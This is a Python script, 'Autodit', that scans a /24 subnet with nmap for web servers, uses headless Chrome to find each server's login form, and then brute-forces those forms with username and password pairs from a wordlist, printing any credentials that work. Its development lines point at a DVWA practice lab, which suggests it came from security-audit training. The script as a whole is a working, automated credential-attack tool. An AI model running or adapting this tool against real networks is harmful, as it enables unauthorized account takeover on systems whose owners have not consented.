import argparse
import subprocess
import re
import webbrowser
import requests
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import os #FOR DEV
from colorama import just_fix_windows_console
just_fix_windows_console()

requests.packages.urllib3.disable_warnings()

AsciiArt = """
      ___           ___                      ___                                             
     /\  \         /\  \                    /\  \         _____                              
    /::\  \        \:\  \         ___      /::\  \       /::\  \       ___           ___     
   /:/\:\  \        \:\  \       /\__\    /:/\:\  \     /:/\:\  \     /\__\         /\__\    
  /:/ /::\  \   ___  \:\  \     /:/  /   /:/  \:\  \   /:/  \:\__\   /:/__/        /:/  /    
 /:/_/:/\:\__\ /\  \  \:\__\   /:/__/   /:/__/ \:\__\ /:/__/ \:|__| /::\  \       /:/__/     
 \:\/:/  \/__/ \:\  \ /:/  /  /::\  \   \:\  \ /:/  / \:\  \ /:/  / \/\:\  \__   /::\  \     
  \::/__/       \:\  /:/  /  /:/\:\  \   \:\  /:/  /   \:\  /:/  /     \:\/\__\ /:/\:\  \    
   \:\  \        \:\/:/  /   \/__\:\  \   \:\/:/  /     \:\/:/  /       \::/  / \/  \:\  \   
    \:\__\        \::/  /         \:\__\   \::/  /       \::/  /        /:/  /       \:\__\  
     \/__/         \/__/           \/__/    \/__/         \/__/         \/__/         \/__/  






"""
print(AsciiArt)

class colors:
    # Regular Colors
    BLACK = '\033[0;30m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'
    # Bold
    BOLD = '\033[1m'
    # Reset
    RESET = '\033[0m'

summary = []

def scrapForm():
    # Removes SSL Issues With Chrome
    options = webdriver.ChromeOptions()
    options.add_argument('--ignore-certificate-errors')
    options.add_argument('--ignore-ssl-errors')
    options.add_argument('--ignore-certificate-errors-spki-list')
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.add_argument('--disable-notifications')
    options.add_argument('--headless') # Comment to view browser actions

    driver = webdriver.Chrome(options=options)
    potential_input_password = []
    potential_input_username = []
    potential_input_submit = []
    try:
        driver.get(url)
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'form input')))
        redirected_url = driver.current_url
        inputs = driver.find_elements(By.CSS_SELECTOR, 'form input')

        for i in inputs: #get potential input 
            input_type = str(i.get_attribute('type')).lower()
            if str(i.get_attribute('disabled')).lower() != 'true' and str(i.value_of_css_property('display')).lower() != 'none' and str(i.get_attribute('name')).lower() != '':
                if input_type == 'password':
                    potential_input_password.append(i)
                elif input_type == 'submit':
                    potential_input_submit.append(i)
                elif any(x in input_type for x in ['text', 'email', 'number', 'tel', 'url', 'search']):
                    potential_input_username.append(i)
    except Exception:
        print(colors.RED+"[-] No form found on " + url + colors.RESET)
    finally:
        if len(potential_input_password) != 1 or len(potential_input_username) > 1 or len(potential_input_submit) > 1:
            print(colors.RED+"[-] Unable to brute-force on " + url + colors.RESET)
            webbrowser.open(url)
        else:
            potential_input_username = None if len(potential_input_username) == 0 else potential_input_username[0]
            potential_input_submit = None if len(potential_input_submit) == 0 else potential_input_submit[0]
            send(redirected_url, potential_input_username, potential_input_password[0], potential_input_submit)
            driver.quit()

def send(redirected_url, input_username, input_password, input_submit):
    with open("wordlist.txt", 'r') as f:
        found = False
        for logins in f.read().split("\n\n"):
            username = logins.split("\n")[0]
            password = logins.split("\n")[1]
            if(input_username == None and input_submit == None):
                payload = {input_password.get_attribute('name'): password}
            elif(input_username == None):
                payload = {input_password.get_attribute('name'): password, input_submit.get_attribute('name'): input_submit.get_attribute('value')}
            elif(input_submit == None):
                payload = {input_username.get_attribute('name'): username, input_password.get_attribute('name'): password}
            else:
                payload = {input_username.get_attribute('name'): username, input_password.get_attribute('name'): password, input_submit.get_attribute('name'): input_submit.get_attribute('value')}
            session = requests.Session()
            try:
                r = session.post(redirected_url, headers={'User-Agent': args.agent}, data=payload, verify=False)
                r = session.get(r.url, headers={'User-Agent': args.agent}, verify=False)
                if r.url != redirected_url:
                    if input_username == None:
                        log = colors.BOLD + colors.GREEN + "[+] Login found on " + url + " : " + password + colors.RESET
                    else:
                        log = colors.BOLD + colors.GREEN + "[+] Login found on " + url + " : " + username + " / " + password + colors.RESET
                    summary.append(log)
                    print(log)
                    found = True
                    break
            except:
                print(colors.RED+"[-] Unable to send post request to " + redirected_url + colors.RESET)
                webbrowser.open(redirected_url)
                break
        if not found:
            print(colors.RED+"[-] No login found on " + url + colors.RESET)

parser = argparse.ArgumentParser(description="Autodit by 123CS")
parser.add_argument('--ip', help="IP class to scan (searching in /24)", required=True)
parser.add_argument('--agent', help="User agent string to send the login as. Default : Agent:Mozilla/5.0", default="Mozilla/5.0", required=False)
parser.add_argument('--wordlist', help="Name of the wordlist file to use. It must be in the format : login1 \\n password1 \\n\\n login2 \\n password2", default="wordlist.txt", required=False)
args = parser.parse_args()

print("[*] Scanning...")
if not os.path.exists(args.ip+"-24.g"): #FOR DEV
    command = "nmap -T4 -F -Pn -oX "+args.ip+"-24.xml -oG - "+args.ip+"/24"

    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    if error:
        print("An error occurred:", error.decode("utf-8"))
        exit(1)

    print(colors.BOLD + colors.GREEN + "[+] Scan done and saved as "+args.ip+"-24.xml" + colors.RESET)
    res_nmap = output.decode("utf-8")
else: #FOR DEV
    with open(args.ip+"-24.g", 'r') as f: #FOR DEV
        res_nmap = f.read() #FOR DEV

print("[*] User-Agent: " + args.agent)
print("[*] Wordlist: " + args.wordlist)

for line in res_nmap.split('\n'):
    if "80/open" in line or "443/open" in line:
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line).group()
        if ip_match == "192.168.152.130": #FOR DEV
            ip_match = ip_match+"/dvwa/" #FOR DEV
        if "80/open" in line:
            url = "http://"+ip_match
        else:
            url = "https://"+ip_match
        #webbrowser.open(url)

        print("[*] URL: " + url)
        scrapForm()

print("\n\n[*] Summary:")
if len(summary) == 0:
    print("No login found")
else:
    for log in summary:
        print(log)
print("\n")